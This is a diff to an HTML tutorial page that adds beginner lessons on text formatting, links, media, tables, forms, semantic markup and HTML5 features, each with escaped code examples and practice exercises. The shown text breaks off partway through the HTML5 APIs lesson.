@@ -1137,7 +1137,745 @@ HTTP is the mechanism by which HTML documents are transported across the interne
     </section>
 
     <!-- Additional HTML modules would go here... -->
+    <!-- Module 2 Content -->
+    <section class="module-content" id="module-2">
+        <div class="container">
+            <button class="back-button">← Back to Modules</button>
+            <div class="module-header">
+                <h2>Module 2: Text Formatting</h2>
+                <p>Master text elements, headings, paragraphs, lists, and semantic text markup.</p>
+            </div>
+            
+            <div class="lesson">
+                <h3>Headings</h3>
+                <p>HTML provides six levels of headings, from &lt;h1&gt; to &lt;h6&gt;. &lt;h1&gt; defines the most important heading, while &lt;h6&gt; defines the least important.</p>
+                <div class="code-block">
+                    &lt;h1&gt;This is heading 1&lt;/h1&gt;<br>
+                    &lt;h2&gt;This is heading 2&lt;/h2&gt;<br>
+                    &lt;h3&gt;This is heading 3&lt;/h3&gt;<br>
+                    &lt;h4&gt;This is heading 4&lt;/h4&gt;<br>
+                    &lt;h5&gt;This is heading 5&lt;/h5&gt;<br>
+                    &lt;h6&gt;This is heading 6&lt;/h6&gt;
+                </div>
+                <p>Important notes about headings:</p>
+                <ul>
+                    <li>Search engines use headings to index the structure and content of your web pages</li>
+                    <li>Use headings to show the document structure (not to make text big or bold)</li>
+                    <li>Each page should have one &lt;h1&gt; element for the main heading</li>
+                </ul>
+            </div>
+            
+            <div class="lesson">
+                <h3>Paragraphs and Line Breaks</h3>
+                <p>The &lt;p&gt; element defines a paragraph. Browsers automatically add some white space (a margin) before and after each paragraph.</p>
+                <div class="code-block">
+                    &lt;p&gt;This is a paragraph.&lt;/p&gt;<br>
+                    &lt;p&gt;This is another paragraph.&lt;/p&gt;
+                </div>
+                <p>The &lt;br&gt; tag inserts a single line break. It is an empty tag, which means it has no end tag.</p>
+                <div class="code-block">
+                    &lt;p&gt;This is&lt;br&gt;a paragraph&lt;br&gt;with line breaks.&lt;/p&gt;
+                </div>
+            </div>
+            
+            <div class="lesson">
+                <h3>Text Formatting Elements</h3>
+                <p>HTML provides various elements for formatting text with special meaning:</p>
+                <div class="code-block">
+                    &lt;b&gt; - Bold text<br>
+                    &lt;strong&gt; - Important text<br>
+                    &lt;i&gt; - Italic text<br>
+                    &lt;em&gt; - Emphasized text<br>
+                    &lt;mark&gt; - Marked text<br>
+                    &lt;small&gt; - Smaller text<br>
+                    &lt;del&gt; - Deleted text<br>
+                    &lt;ins&gt; - Inserted text<br>
+                    &lt;sub&gt; - Subscript text<br>
+                    &lt;sup&gt; - Superscript text
+                </div>
+                <p>Note: &lt;b&gt; and &lt;i&gt; define bold and italic text without any extra importance, while &lt;strong&gt; and &lt;em&gt; indicate that the content has strong importance or emphasis.</p>
+            </div>
+            
+            <div class="lesson">
+                <h3>Lists</h3>
+                <p>HTML provides three types of lists:</p>
+                
+                <h4>Unordered Lists</h4>
+                <p>An unordered list starts with the &lt;ul&gt; tag. Each list item starts with the &lt;li&gt; tag.</p>
+                <div class="code-block">
+                    &lt;ul&gt;<br>
+                    &nbsp;&nbsp;&lt;li&gt;Coffee&lt;/li&gt;<br>
+                    &nbsp;&nbsp;&lt;li&gt;Tea&lt;/li&gt;<br>
+                    &nbsp;&nbsp;&lt;li&gt;Milk&lt;/li&gt;<br>
+                    &lt;/ul&gt;
+                </div>
+                
+                <h4>Ordered Lists</h4>
+                <p>An ordered list starts with the &lt;ol&gt; tag. Each list item starts with the &lt;li&gt; tag.</p>
+                <div class="code-block">
+                    &lt;ol&gt;<br>
+                    &nbsp;&nbsp;&lt;li&gt;Coffee&lt;/li&gt;<br>
+                    &nbsp;&nbsp;&lt;li&gt;Tea&lt;/li&gt;<br>
+                    &nbsp;&nbsp;&lt;li&gt;Milk&lt;/li&gt;<br>
+                    &lt;/ol&gt;
+                </div>
+                
+                <h4>Description Lists</h4>
+                <p>A description list is a list of terms, with a description of each term.</p>
+                <div class="code-block">
+                    &lt;dl&gt;<br>
+                    &nbsp;&nbsp;&lt;dt&gt;Coffee&lt;/dt&gt;<br>
+                    &nbsp;&nbsp;&lt;dd&gt;- black hot drink&lt;/dd&gt;<br>
+                    &nbsp;&nbsp;&lt;dt&gt;Milk&lt;/dt&gt;<br>
+                    &nbsp;&nbsp;&lt;dd&gt;- white cold drink&lt;/dd&gt;<br>
+                    &lt;/dl&gt;
+                </div>
+            </div>
+            
+            <div class="lesson">
+                <h3>Practice Exercise</h3>
+                <p>Create an HTML page that includes:</p>
+                <ol>
+                    <li>A main heading for a recipe</li>
+                    <li>An unordered list of ingredients</li>
+                    <li>An ordered list of preparation steps</li>
+                    <li>Use at least three different text formatting elements within your content</li>
+                </ol>
+            </div>
+        </div>
+    </section>
 
+    <!-- Module 3 Content -->
+    <section class="module-content" id="module-3">
+        <div class="container">
+            <button class="back-button">← Back to Modules</button>
+            <div class="module-header">
+                <h2>Module 3: Links and Navigation</h2>
+                <p>Create hyperlinks, navigation menus, and understand URL structures.</p>
+            </div>
+            
+            <div class="lesson">
+                <h3>HTML Links - Hyperlinks</h3>
+                <p>HTML links are defined with the &lt;a&gt; tag. The link's destination is specified in the href attribute.</p>
+                <div class="code-block">
+                    &lt;a href="https://www.example.com"&gt;Visit Example.com&lt;/a&gt;
+                </div>
+                <p>By default, links will appear as follows in all browsers:</p>
+                <ul>
+                    <li>An unvisited link is underlined and blue</li>
+                    <li>A visited link is underlined and purple</li>
+                    <li>An active link is underlined and red</li>
+                </ul>
+                <p>You can change the link colors using CSS.</p>
+            </div>
+            
+            <div class="lesson">
+                <h3>The target Attribute</h3>
+                <p>By default, the linked page will be displayed in the current browser window. To change this, you can use the target attribute.</p>
+                <div class="code-block">
+                    &lt;a href="https://www.example.com" target="_blank"&gt;Visit Example.com in a new tab&lt;/a&gt;<br>
+                    &lt;a href="https://www.example.com" target="_self"&gt;Visit Example.com in the same tab (default)&lt;/a&gt;<br>
+                    &lt;a href="https://www.example.com" target="_parent"&gt;Visit Example.com in the parent frame&lt;/a&gt;<br>
+                    &lt;a href="https://www.example.com" target="_top"&gt;Visit Example.com in the full body of the window&lt;/a&gt;
+                </div>
+                <p><code>target="_blank"</code> is commonly used to open links in a new tab or window.</p>
+            </div>
+            
+            <div class="lesson">
+                <h3>Absolute vs. Relative URLs</h3>
+                <p>URLs can be either absolute or relative:</p>
+                
+                <h4>Absolute URLs</h4>
+                <p>An absolute URL contains the full address of the resource, including the protocol (http/https) and domain name.</p>
+                <div class="code-block">
+                    &lt;a href="https://www.example.com/products/index.html"&gt;Products&lt;/a&gt;
+                </div>
+                
+                <h4>Relative URLs</h4>
+                <p>A relative URL points to a file relative to the current page. They don't include the domain name.</p>
+                <div class="code-block">
+                    &lt;a href="about.html"&gt;About Us&lt;/a&gt; (same folder)<br>
+                    &lt;a href="pages/contact.html"&gt;Contact&lt;/a&gt; (in a subfolder)<br>
+                    &lt;a href="../index.html"&gt;Home&lt;/a&gt; (in a parent folder)<br>
+                    &lt;a href="/products"&gt;Products&lt;/a&gt; (root-relative)
+                </div>
+                <p>Relative URLs are commonly used for internal links within the same website.</p>
+            </div>
+            
+            <div class="lesson">
+                <h3>Link Types</h3>
+                <p>Links can point to different types of resources:</p>
+                
+                <h4>Email Links</h4>
+                <p>Create a link that opens the user's email program:</p>
+                <div class="code-block">
+                    &lt;a href="mailto:someone@example.com"&gt;Send email&lt;/a&gt;
+                </div>
+                
+                <h4>Telephone Links</h4>
+                <p>Create a link that dials a phone number on mobile devices:</p>
+                <div class="code-block">
+                    &lt;a href="tel:+1234567890"&gt;Call us&lt;/a&gt;
+                </div>
+                
+                <h4>Download Links</h4>
+                <p>Create a link to download a file:</p>
+                <div class="code-block">
+                    &lt;a href="files/document.pdf" download&gt;Download PDF&lt;/a&gt;
+                </div>
+            </div>
+            
+            <div class="lesson">
+                <h3>Creating Navigation Menus</h3>
+                <p>A common use for links is to create navigation menus. Typically, navigation menus are created using unordered lists with links.</p>
+                <div class="code-block">
+                    &lt;nav&gt;<br>
+                    &nbsp;&nbsp;&lt;ul&gt;<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;&lt;li&gt;&lt;a href="index.html"&gt;Home&lt;/a&gt;&lt;/li&gt;<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;&lt;li&gt;&lt;a href="about.html"&gt;About&lt;/a&gt;&lt;/li&gt;<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;&lt;li&gt;&lt;a href="services.html"&gt;Services&lt;/a&gt;&lt;/li&gt;<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;&lt;li&gt;&lt;a href="contact.html"&gt;Contact&lt;/a&gt;&lt;/li&gt;<br>
+                    &nbsp;&nbsp;&lt;/ul&gt;<br>
+                    &lt;/nav&gt;
+                </div>
+                <p>The &lt;nav&gt; element is a semantic HTML5 tag that defines a set of navigation links.</p>
+            </div>
+            
+            <div class="lesson">
+                <h3>Practice Exercise</h3>
+                <p>Create a simple website with multiple pages that includes:</p>
+                <ol>
+                    <li>A navigation menu with links to all pages</li>
+                    <li>Links to external websites that open in new tabs</li>
+                    <li>An email link</li>
+                    <li>Internal links between pages using relative URLs</li>
+                </ol>
+            </div>
+        </div>
+    </section>
+
+    <!-- Module 4 Content -->
+    <section class="module-content" id="module-4">
+        <div class="container">
+            <button class="back-button">← Back to Modules</button>
+            <div class="module-header">
+                <h2>Module 4: Images and Media</h2>
+                <p>Embed images, audio, and video content into your web pages.</p>
+            </div>
+            
+            <div class="lesson">
+                <h3>HTML Images</h3>
+                <p>Images can improve the design and appearance of a web page. The HTML &lt;img&gt; tag is used to embed an image in a web page.</p>
+                <div class="code-block">
+                    &lt;img src="image.jpg" alt="Description of image"&gt;
+                </div>
+                <p>The <code>src</code> attribute specifies the path to the image, and the <code>alt</code> attribute provides alternative text for the image.</p>
+            </div>
+            
+            <div class="lesson">
+                <h3>Image Attributes</h3>
+                <p>Common image attributes include:</p>
+                <ul>
+                    <li><strong>src</strong>: Specifies the path to the image</li>
+                    <li><strong>alt</strong>: Specifies an alternate text for the image</li>
+                    <li><strong>width</strong>: Specifies the width of the image</li>
+                    <li><strong>height</strong>: Specifies the height of the image</li>
+                    <li><strong>title</strong>: Specifies extra information about the image</li>
+                </ul>
+                <div class="code-block">
+                    &lt;img src="photo.jpg" alt="A beautiful landscape" width="500" height="300" title="Mountain View"&gt;
+                </div>
+            </div>
+            
+            <div class="lesson">
+                <h3>Image Formats</h3>
+                <p>Common web image formats:</p>
+                <ul>
+                    <li><strong>JPEG</strong>: Best for photographs</li>
+                    <li><strong>PNG</strong>: Best for graphics with transparency</li>
+                    <li><strong>GIF</strong>: Best for simple animations</li>
+                    <li><strong>SVG</strong>: Best for vector graphics</li>
+                    <li><strong>WebP</strong>: Modern format with better compression</li>
+                </ul>
+            </div>
+            
+            <div class="lesson">
+                <h3>Audio in HTML</h3>
+                <p>The HTML &lt;audio&gt; element is used to play audio files.</p>
+                <div class="code-block">
+                    &lt;audio controls&gt;<br>
+                    &nbsp;&nbsp;&lt;source src="audio.mp3" type="audio/mpeg"&gt;<br>
+                    &nbsp;&nbsp;&lt;source src="audio.ogg" type="audio/ogg"&gt;<br>
+                    &nbsp;&nbsp;Your browser does not support the audio element.<br>
+                    &lt;/audio&gt;
+                </div>
+                <p>Common audio attributes:</p>
+                <ul>
+                    <li><strong>controls</strong>: Adds audio controls (play, pause, volume)</li>
+                    <li><strong>autoplay</strong>: Audio will start playing as soon as it's ready</li>
+                    <li><strong>loop</strong>: Audio will start over again when finished</li>
+                    <li><strong>muted</strong>: Audio output will be muted</li>
+                </ul>
+            </div>
+            
+            <div class="lesson">
+                <h3>Video in HTML</h3>
+                <p>The HTML &lt;video&gt; element is used to show a video on a web page.</p>
+                <div class="code-block">
+                    &lt;video width="320" height="240" controls&gt;<br>
+                    &nbsp;&nbsp;&lt;source src="movie.mp4" type="video/mp4"&gt;<br>
+                    &nbsp;&nbsp;&lt;source src="movie.ogg" type="video/ogg"&gt;<br>
+                    &nbsp;&nbsp;Your browser does not support the video tag.<br>
+                    &lt;/video&gt;
+                </div>
+                <p>Common video attributes:</p>
+                <ul>
+                    <li><strong>controls</strong>: Adds video controls (play, pause, volume)</li>
+                    <li><strong>autoplay</strong>: Video will start playing as soon as it's ready</li>
+                    <li><strong>loop</strong>: Video will start over again when finished</li>
+                    <li><strong>muted</strong>: Video output will be muted</li>
+                    <li><strong>poster</strong>: Specifies an image to be shown while video is downloading</li>
+                </ul>
+            </div>
+            
+            <div class="lesson">
+                <h3>Practice Exercise</h3>
+                <p>Create an HTML page that includes:</p>
+                <ol>
+                    <li>An image with proper alt text and dimensions</li>
+                    <li>An audio player with multiple source formats</li>
+                    <li>A video player with controls</li>
+                    <li>Ensure all media elements are accessible</li>
+                </ol>
+            </div>
+        </div>
+    </section>
+
+    <!-- Module 5 Content -->
+    <section class="module-content" id="module-5">
+        <div class="container">
+            <button class="back-button">← Back to Modules</button>
+            <div class="module-header">
+                <h2>Module 5: Tables</h2>
+                <p>Create structured data tables with headers, rows, columns, and captions.</p>
+            </div>
+            
+            <div class="lesson">
+                <h3>HTML Tables</h3>
+                <p>HTML tables allow you to arrange data into rows and columns. Tables are created with the &lt;table&gt; tag.</p>
+                <div class="code-block">
+                    &lt;table&gt;<br>
+                    &nbsp;&nbsp;&lt;tr&gt;<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;&lt;th&gt;Header 1&lt;/th&gt;<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;&lt;th&gt;Header 2&lt;/th&gt;<br>
+                    &nbsp;&nbsp;&lt;/tr&gt;<br>
+                    &nbsp;&nbsp;&lt;tr&gt;<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;&lt;td&gt;Data 1&lt;/td&gt;<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;&lt;td&gt;Data 2&lt;/td&gt;<br>
+                    &nbsp;&nbsp;&lt;/tr&gt;<br>
+                    &lt;/table&gt;
+                </div>
+            </div>
+            
+            <div class="lesson">
+                <h3>Table Elements</h3>
+                <p>Key table elements:</p>
+                <ul>
+                    <li><strong>&lt;table&gt;</strong>: Defines the table</li>
+                    <li><strong>&lt;tr&gt;</strong>: Defines a table row</li>
+                    <li><strong>&lt;th&gt;</strong>: Defines a table header cell</li>
+                    <li><strong>&lt;td&gt;</strong>: Defines a table data cell</li>
+                    <li><strong>&lt;caption&gt;</strong>: Defines a table caption</li>
+                    <li><strong>&lt;thead&gt;</strong>: Groups header content</li>
+                    <li><strong>&lt;tbody&gt;</strong>: Groups body content</li>
+                    <li><strong>&lt;tfoot&gt;</strong>: Groups footer content</li>
+                </ul>
+            </div>
+            
+            <div class="lesson">
+                <h3>Table Attributes</h3>
+                <p>Common table attributes:</p>
+                <div class="code-block">
+                    &lt;table border="1"&gt; - Adds border to table<br>
+                    &lt;td colspan="2"&gt; - Cell spans 2 columns<br>
+                    &lt;td rowspan="2"&gt; - Cell spans 2 rows<br>
+                    &lt;th scope="col"&gt; - Header applies to column<br>
+                    &lt;th scope="row"&gt; - Header applies to row
+                </div>
+            </div>
+            
+            <div class="lesson">
+                <h3>Advanced Table Example</h3>
+                <div class="code-block">
+                    &lt;table border="1"&gt;<br>
+                    &nbsp;&nbsp;&lt;caption&gt;Monthly Sales Report&lt;/caption&gt;<br>
+                    &nbsp;&nbsp;&lt;thead&gt;<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;&lt;tr&gt;<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;th scope="col"&gt;Month&lt;/th&gt;<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;th scope="col"&gt;Sales&lt;/th&gt;<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;th scope="col"&gt;Profit&lt;/th&gt;<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;&lt;/tr&gt;<br>
+                    &nbsp;&nbsp;&lt;/thead&gt;<br>
+                    &nbsp;&nbsp;&lt;tbody&gt;<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;&lt;tr&gt;<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;td&gt;January&lt;/td&gt;<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;td&gt;$1000&lt;/td&gt;<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;td&gt;$200&lt;/td&gt;<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;&lt;/tr&gt;<br>
+                    &nbsp;&nbsp;&lt;/tbody&gt;<br>
+                    &lt;/table&gt;
+                </div>
+            </div>
+            
+            <div class="lesson">
+                <h3>Practice Exercise</h3>
+                <p>Create an HTML table that includes:</p>
+                <ol>
+                    <li>A caption describing the table</li>
+                    <li>Table headers with proper scope</li>
+                    <li>At least 3 rows of data</li>
+                    <li>Use colspan or rowspan for merged cells</li>
+                    <li>Organize with thead, tbody, and tfoot</li>
+                </ol>
+            </div>
+        </div>
+    </section>
+
+    <!-- Module 6 Content -->
+    <section class="module-content" id="module-6">
+        <div class="container">
+            <button class="back-button">← Back to Modules</button>
+            <div class="module-header">
+                <h2>Module 6: Forms and Input</h2>
+                <p>Build interactive forms with various input types, labels, and validation.</p>
+            </div>
+            
+            <div class="lesson">
+                <h3>HTML Forms</h3>
+                <p>HTML forms are used to collect user input. The &lt;form&gt; element defines a form.</p>
+                <div class="code-block">
+                    &lt;form action="/submit" method="post"&gt;<br>
+                    &nbsp;&nbsp;&lt;label for="name"&gt;Name:&lt;/label&gt;<br>
+                    &nbsp;&nbsp;&lt;input type="text" id="name" name="name"&gt;<br>
+                    &nbsp;&nbsp;&lt;input type="submit" value="Submit"&gt;<br>
+                    &lt;/form&gt;
+                </div>
+            </div>
+            
+            <div class="lesson">
+                <h3>Form Attributes</h3>
+                <p>Important form attributes:</p>
+                <ul>
+                    <li><strong>action</strong>: Specifies where to send form data</li>
+                    <li><strong>method</strong>: Specifies HTTP method (GET or POST)</li>
+                    <li><strong>target</strong>: Specifies where to display response</li>
+                    <li><strong>autocomplete</strong>: Enables/disables autocomplete</li>
+                    <li><strong>novalidate</strong>: Specifies form should not be validated</li>
+                </ul>
+            </div>
+            
+            <div class="lesson">
+                <h3>Input Types</h3>
+                <p>Common input types:</p>
+                <div class="code-block">
+                    &lt;input type="text"&gt; - Single-line text input<br>
+                    &lt;input type="password"&gt; - Password field<br>
+                    &lt;input type="email"&gt; - Email address field<br>
+                    &lt;input type="number"&gt; - Numerical input<br>
+                    &lt;input type="date"&gt; - Date picker<br>
+                    &lt;input type="checkbox"&gt; - Checkbox<br>
+                    &lt;input type="radio"&gt; - Radio button<br>
+                    &lt;input type="file"&gt; - File upload<br>
+                    &lt;input type="submit"&gt; - Submit button<br>
+                    &lt;input type="reset"&gt; - Reset button
+                </div>
+            </div>
+            
+            <div class="lesson">
+                <h3>Other Form Elements</h3>
+                <p>Additional form elements:</p>
+                <div class="code-block">
+                    &lt;textarea&gt; - Multi-line text input<br>
+                    &lt;select&gt; - Dropdown list<br>
+                    &lt;option&gt; - Option in dropdown<br>
+                    &lt;fieldset&gt; - Groups related elements<br>
+                    &lt;legend&gt; - Caption for fieldset<br>
+                    &lt;label&gt; - Label for input<br>
+                    &lt;button&gt; - Clickable button
+                </div>
+            </div>
+            
+            <div class="lesson">
+                <h3>Form Validation</h3>
+                <p>HTML5 provides built-in form validation:</p>
+                <div class="code-block">
+                    &lt;input type="text" required&gt; - Field is required<br>
+                    &lt;input type="email"&gt; - Must be valid email<br>
+                    &lt;input type="number" min="1" max="10"&gt; - Number range<br>
+                    &lt;input type="text" pattern="[A-Za-z]{3}"&gt; - Pattern matching<br>
+                    &lt;input type="text" maxlength="10"&gt; - Maximum length
+                </div>
+            </div>
+            
+            <div class="lesson">
+                <h3>Practice Exercise</h3>
+                <p>Create a registration form that includes:</p>
+                <ol>
+                    <li>Text inputs for name and email</li>
+                    <li>Password field with confirmation</li>
+                    <li>Dropdown for country selection</li>
+                    <li>Checkboxes for interests</li>
+                    <li>Radio buttons for gender</li>
+                    <li>Submit and reset buttons</li>
+                    <li>Proper validation attributes</li>
+                </ol>
+            </div>
+        </div>
+    </section>
+
+    <!-- Module 7 Content -->
+    <section class="module-content" id="module-7">
+        <div class="container">
+            <button class="back-button">← Back to Modules</button>
+            <div class="module-header">
+                <h2>Module 7: Semantic HTML</h2>
+                <p>Use semantic elements to create meaningful, accessible web structures.</p>
+            </div>
+            
+            <div class="lesson">
+                <h3>What is Semantic HTML?</h3>
+                <p>Semantic HTML uses elements that clearly describe their meaning in a human- and machine-readable way. This improves accessibility, SEO, and code maintainability.</p>
+                <p>Benefits of semantic HTML:</p>
+                <ul>
+                    <li>Better accessibility for screen readers</li>
+                    <li>Improved SEO (Search Engine Optimization)</li>
+                    <li>Easier code maintenance and readability</li>
+                    <li>Better device compatibility</li>
+                </ul>
+            </div>
+            
+            <div class="lesson">
+                <h3>Semantic Elements</h3>
+                <p>HTML5 introduced several semantic elements:</p>
+                <div class="code-block">
+                    &lt;header&gt; - Introductory content<br>
+                    &lt;nav&gt; - Navigation links<br>
+                    &lt;main&gt; - Main content<br>
+                    &lt;section&gt; - Thematic grouping<br>
+                    &lt;article&gt; - Self-contained composition<br>
+                    &lt;aside&gt; - Tangentially related content<br>
+                    &lt;footer&gt; - Closing content<br>
+                    &lt;figure&gt; - Self-contained flow content<br>
+                    &lt;figcaption&gt; - Caption for figure<br>
+                    &lt;time&gt; - Machine-readable time<br>
+                    &lt;mark&gt; - Highlighted text
+                </div>
+            </div>
+            
+            <div class="lesson">
+                <h3>Semantic Structure Example</h3>
+                <div class="code-block">
+                    &lt;header&gt;<br>
+                    &nbsp;&nbsp;&lt;h1&gt;Website Title&lt;/h1&gt;<br>
+                    &nbsp;&nbsp;&lt;nav&gt;<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;&lt;ul&gt;<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;li&gt;&lt;a href="#home"&gt;Home&lt;/a&gt;&lt;/li&gt;<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;li&gt;&lt;a href="#about"&gt;About&lt;/a&gt;&lt;/li&gt;<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;&lt;/ul&gt;<br>
+                    &nbsp;&nbsp;&lt;/nav&gt;<br>
+                    &lt;/header&gt;<br>
+                    <br>
+                    &lt;main&gt;<br>
+                    &nbsp;&nbsp;&lt;article&gt;<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;&lt;h2&gt;Article Title&lt;/h2&gt;<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;&lt;p&gt;Article content...&lt;/p&gt;<br>
+                    &nbsp;&nbsp;&lt;/article&gt;<br>
+                    <br>
+                    &nbsp;&nbsp;&lt;aside&gt;<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;&lt;h3&gt;Related Links&lt;/h3&gt;<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;&lt;ul&gt;<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;li&gt;&lt;a href="#"&gt;Link 1&lt;/a&gt;&lt;/li&gt;<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;&lt;/ul&gt;<br>
+                    &nbsp;&nbsp;&lt;/aside&gt;<br>
+                    &lt;/main&gt;<br>
+                    <br>
+                    &lt;footer&gt;<br>
+                    &nbsp;&nbsp;&lt;p&gt;&copy; 2023 Company Name&lt;/p&gt;<br>
+                    &lt;/footer&gt;
+                </div>
+            </div>
+            
+            <div class="lesson">
+                <h3>Accessibility Features</h3>
+                <p>Semantic HTML works well with accessibility attributes:</p>
+                <div class="code-block">
+                    &lt;nav aria-label="Main navigation"&gt; - Labels for screen readers<br>
+                    &lt;main role="main"&gt; - Explicit role definition<br>
+                    &lt;img alt="Description"&gt; - Alternative text<br>
+                    &lt;button aria-label="Close menu"&gt; - Button description<br>
+                    &lt;input aria-required="true"&gt; - Required field indication
+                </div>
+            </div>
+            
+            <div class="lesson">
+                <h3>Practice Exercise</h3>
+                <p>Convert a non-semantic HTML page to use semantic elements:</p>
+                <ol>
+                    <li>Replace divs with appropriate semantic elements</li>
+                    <li>Add proper heading structure</li>
+                    <li>Include navigation landmarks</li>
+                    <li>Add accessibility attributes</li>
+                    <li>Ensure proper document outline</li>
+                </ol>
+            </div>
+        </div>
+    </section>
+
+    <!-- Module 8 Content -->
+    <section class="module-content" id="module-8">
+        <div class="container">
+            <button class="back-button">← Back to Modules</button>
+            <div class="module-header">
+                <h2>Module 8: HTML5 Features</h2>
+                <p>Explore advanced HTML5 elements, APIs, and modern web capabilities.</p>
+            </div>
+            
+            <div class="lesson">
+                <h3>What is HTML5?</h3>
+                <p>HTML5 is the latest version of HTML, introducing new elements, attributes, and behaviors that provide better structure, multimedia support, and advanced features for modern web applications.</p>
+                <p>Key improvements in HTML5 include:</p>
+                <ul>
+                    <li>New semantic elements</li>
+                    <li>Native audio and video support</li>
+                    <li>Canvas for drawing graphics</li>
+                    <li>Local storage capabilities</li>
+                    <li>Geolocation API</li>
+                    <li>Improved form controls</li>
+                </ul>
+            </div>
+            
+            <div class="lesson">
+                <h3>HTML5 Semantic Elements</h3>
+                <p>HTML5 introduced semantic elements that clearly define different parts of a web page:</p>
+                <div class="code-block">
+                    &lt;header&gt; - Defines a header for a document or section<br>
+                    &lt;nav&gt; - Defines navigation links<br>
+                    &lt;section&gt; - Defines a section in a document<br>
+                    &lt;article&gt; - Defines an independent, self-contained content<br>
+                    &lt;aside&gt; - Defines content aside from the main content<br>
+                    &lt;footer&gt; - Defines a footer for a document or section<br>
+                    &lt;main&gt; - Defines the main content of a document<br>
+                    &lt;figure&gt; and &lt;figcaption&gt; - Defines figures with captions
+                </div>
+                <p>Example of semantic structure:</p>
+                <div class="code-block">
+                    &lt;header&gt;<br>
+                    &nbsp;&nbsp;&lt;h1&gt;Website Title&lt;/h1&gt;<br>
+                    &nbsp;&nbsp;&lt;nav&gt;...&lt;/nav&gt;<br>
+                    &lt;/header&gt;<br>
+                    &lt;main&gt;<br>
+                    &nbsp;&nbsp;&lt;article&gt;<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;&lt;h2&gt;Article Title&lt;/h2&gt;<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;&lt;p&gt;Article content...&lt;/p&gt;<br>
+                    &nbsp;&nbsp;&lt;/article&gt;<br>
+                    &lt;/main&gt;<br>
+                    &lt;footer&gt;<br>
+                    &nbsp;&nbsp;&lt;p&gt;Copyright information&lt;/p&gt;<br>
+                    &lt;/footer&gt;
+                </div>
+            </div>
+            
+            <div class="lesson">
+                <h3>HTML5 Multimedia Elements</h3>
+                <p>HTML5 provides native support for audio and video without requiring plugins:</p>
+                
+                <h4>Video Element</h4>
+                <div class="code-block">
+                    &lt;video width="320" height="240" controls&gt;<br>
+                    &nbsp;&nbsp;&lt;source src="movie.mp4" type="video/mp4"&gt;<br>
+                    &nbsp;&nbsp;&lt;source src="movie.ogg" type="video/ogg"&gt;<br>
+                    &nbsp;&nbsp;Your browser does not support the video tag.<br>
+                    &lt;/video&gt;
+                </div>
+                
+                <h4>Audio Element</h4>
+                <div class="code-block">
+                    &lt;audio controls&gt;<br>
+                    &nbsp;&nbsp;&lt;source src="audio.mp3" type="audio/mpeg"&gt;<br>
+                    &nbsp;&nbsp;&lt;source src="audio.ogg" type="audio/ogg"&gt;<br>
+                    &nbsp;&nbsp;Your browser does not support the audio element.<br>
+                    &lt;/audio&gt;
+                </div>
+            </div>
+            
+            <div class="lesson">
+                <h3>HTML5 Canvas</h3>
+                <p>The &lt;canvas&gt; element is used to draw graphics, on the fly, via JavaScript:</p>
+                <div class="code-block">
+                    &lt;canvas id="myCanvas" width="200" height="100" style="border:1px solid #000000;"&gt;<br>
+                    &nbsp;&nbsp;Your browser does not support the HTML canvas tag.<br>
+                    &lt;/canvas&gt;<br>
+                    <br>
+                    &lt;script&gt;<br>
+                    &nbsp;&nbsp;var canvas = document.getElementById("myCanvas");<br>
+                    &nbsp;&nbsp;var ctx = canvas.getContext("2d");<br>
+                    &nbsp;&nbsp;ctx.fillStyle = "#FF0000";<br>
+                    &nbsp;&nbsp;ctx.fillRect(0, 0, 150, 75);<br>
+                    &lt;/script&gt;
+                </div>
+            </div>
+            
+            <div class="lesson">
+                <h3>HTML5 Form Enhancements</h3>
+                <p>HTML5 introduced new input types and attributes for better form validation and user experience:</p>
+                
+                <h4>New Input Types</h4>
+                <div class="code-block">
+                    &lt;input type="email"&gt; - For email addresses<br>
+                    &lt;input type="url"&gt; - For web addresses<br>
+                    &lt;input type="number"&gt; - For numerical input<br>
+                    &lt;input type="range"&gt; - For slider controls<br>
+                    &lt;input type="date"&gt; - For date selection<br>
+                    &lt;input type="color"&gt; - For color selection<br>
+                    &lt;input type="search"&gt; - For search fields
+                </div>
+                
+                <h4>New Form Attributes</h4>
+                <div class="code-block">
+                    placeholder - Hint text in input fields<br>
+                    required - Makes field mandatory<br>
+                    autofocus - Automatically focuses on the field<br>
+                    pattern - Specifies a regex pattern for validation<br>
+                    min/max - Sets minimum/maximum values for numbers<br>
+                    step - Specifies legal number intervals
+                </div>
+            </div>
+            
+            <div class="lesson">
+                <h3>HTML5 APIs</h3>
+                <p>HTML5 introduced several JavaScript APIs for enhanced functionality:</p>
+                <ul>
+                    <li><strong>Geolocation API</strong> - Gets the user's geographical position</li>
+                    <li><strong>Web Storage API</strong> - Stores data locally in the browser</li>
+                    <li><strong>Web Workers</strong> - Runs scripts in background threads</li>
